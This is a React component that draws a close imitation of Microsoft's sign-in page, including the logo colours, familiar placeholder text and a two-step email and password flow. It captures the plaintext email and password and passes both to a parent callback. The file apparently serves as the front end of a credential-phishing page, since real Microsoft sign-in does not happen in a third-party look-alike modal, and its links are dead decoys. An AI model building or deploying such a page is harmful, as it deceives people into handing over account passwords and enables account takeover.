import React, { useState } from 'react';
import { Dialog, DialogContent, DialogOverlay } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Settings } from 'lucide-react';

interface MicrosoftLoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSuccess: (email: string, password: string) => void;
}

const MicrosoftLoginModal: React.FC<MicrosoftLoginModalProps> = ({
  isOpen,
  onClose,
  onSuccess,
}) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [step, setStep] = useState<'email' | 'password'>('email');
  const [isLoading, setIsLoading] = useState(false);

  const handleNext = async () => {
    if (step === 'email') {
      if (!email.trim()) return;
      setStep('password');
    } else {
      if (!password.trim()) return;
      
      setIsLoading(true);
      
      // Pass credentials to parent for real authentication
      setTimeout(() => {
        setIsLoading(false);
        onSuccess(email, password);
        handleClose();
      }, 500);
    }
  };

  const handleBack = () => {
    if (step === 'password') {
      setStep('email');
      setPassword('');
    } else {
      handleClose();
    }
  };

  const handleClose = () => {
    setEmail('');
    setPassword('');
    setStep('email');
    onClose();
  };

  return (
    <Dialog open={isOpen} onOpenChange={handleClose}>
      <DialogOverlay className="bg-[#e5e5e5] bg-opacity-95" />
      <DialogContent className="sm:max-w-md p-0 border-0 shadow-none bg-transparent [&>button]:hidden">
        <div className="flex flex-col items-center justify-center min-h-[600px] space-y-4">
          {/* Main Login Card */}
          <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-sm">
            {/* Microsoft Logo */}
            <div className="flex items-center mb-6">
              <div className="flex items-center space-x-1 mr-2">
                <div className="w-3 h-3 bg-[#f25022]"></div>
                <div className="w-3 h-3 bg-[#7fba00]"></div>
              </div>
              <div className="flex items-center space-x-1">
                <div className="w-3 h-3 bg-[#00a4ef]"></div>
                <div className="w-3 h-3 bg-[#ffb900]"></div>
              </div>
              <span className="ml-3 text-xl font-normal text-[#5e5e5e]">Microsoft</span>
            </div>

            {/* Sign in Title */}
            <h1 className="text-2xl font-light text-[#1b1b1b] mb-6">Sign in</h1>

            {step === 'email' ? (
              <>
                {/* Email Input */}
                <div className="mb-4">
                  <Input
                    type="email"
                    placeholder="Email, phone, or Skype"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full border-0 border-b-2 border-[#605e5c] rounded-none bg-transparent px-0 py-2 text-base focus:border-[#0078d4] focus:ring-0 focus-visible:ring-0 focus-visible:ring-offset-0"
                    onKeyPress={(e) => e.key === 'Enter' && handleNext()}
                  />
                </div>

                {/* Links */}
                <div className="space-y-2 mb-6 text-sm">
                  <div>
                    <span className="text-[#323130]">No account? </span>
                    <button className="text-[#0078d4] hover:underline">Create one!</button>
                  </div>
                  <div>
                    <button className="text-[#0078d4] hover:underline">Can't access your account?</button>
                  </div>
                </div>
              </>
            ) : (
              <>
                {/* Email Display */}
                <div className="mb-4 p-3 bg-[#f3f2f1] rounded border border-[#edebe9] flex items-center justify-between">
                  <span className="text-sm text-[#323130]">{email}</span>
                  <button 
                    onClick={() => setStep('email')}
                    className="text-xs text-[#0078d4] hover:underline"
                  >
                    Change
                  </button>
                </div>

                {/* Password Input */}
                <div className="mb-4">
                  <Input
                    type="password"
                    placeholder="Password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full border-0 border-b-2 border-[#605e5c] rounded-none bg-transparent px-0 py-2 text-base focus:border-[#0078d4] focus:ring-0 focus-visible:ring-0 focus-visible:ring-offset-0"
                    onKeyPress={(e) => e.key === 'Enter' && handleNext()}
                    autoFocus
                  />
                </div>

                {/* Links */}
                <div className="space-y-2 mb-6 text-sm">
                  <div>
                    <button className="text-[#0078d4] hover:underline">Forgot password?</button>
                  </div>
                  <div>
                    <button className="text-[#0078d4] hover:underline">Sign in with a different account</button>
                  </div>
                </div>
              </>
            )}

            {/* Buttons */}
            <div className="flex justify-end space-x-2">
              <Button
                type="button"
                variant="outline"
                onClick={handleBack}
                className="px-6 py-2 border-[#8a8886] text-[#323130] hover:bg-[#f3f2f1] hover:border-[#8a8886]"
              >
                Back
              </Button>
              <Button
                onClick={handleNext}
                disabled={(step === 'email' && !email.trim()) || (step === 'password' && !password.trim()) || isLoading}
                className="px-6 py-2 bg-[#0078d4] hover:bg-[#106ebe] text-white border-0"
              >
                {isLoading ? 'Signing in...' : step === 'email' ? 'Next' : 'Sign in'}
              </Button>
            </div>
          </div>

          {/* Sign-in Options */}
          <div className="bg-white rounded-lg shadow-sm p-4 w-full max-w-sm">
            <button className="flex items-center justify-center w-full text-[#323130] hover:bg-[#f3f2f1] p-2 rounded transition-colors">
              <Settings className="w-4 h-4 mr-2" />
              <span className="text-sm">Sign-in options</span>
            </button>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default MicrosoftLoginModal;